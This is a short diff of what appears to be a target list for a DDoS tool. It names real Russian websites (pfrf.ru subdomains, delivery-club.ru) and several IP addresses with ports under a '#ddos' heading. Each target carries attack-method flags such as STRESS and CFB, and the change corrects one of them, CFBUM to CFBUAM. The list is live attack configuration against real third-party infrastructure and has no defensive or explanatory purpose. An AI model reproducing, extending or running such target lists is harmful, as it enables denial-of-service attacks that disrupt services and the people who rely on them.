@@ -16,7 +16,7 @@ https://hosting.pfrf.ru https://school.pfrf.ru https://es.pfrf.ru https://www.es
 #ddos separiv
 
 http://www.delivery-club.ru --http-methods STRESS
-http://help.delivery-club.ru https://help.delivery-club.ru --http-methods CFB CFBUM
+http://help.delivery-club.ru https://help.delivery-club.ru --http-methods CFB CFBUAM
 tcp://128.140.175.206:443 tcp://128.140.175.206:80 tcp://128.140.175.215:443 tcp://128.140.175.215:80 
 tcp://128.140.175.200:80 tcp://128.140.175.200:443 tcp://128.140.175.205:443 tcp://128.140.175.205:80 
 tcp://128.140.175.214:443 tcp://128.140.175.214:80 tcp://178.57.71.190:443
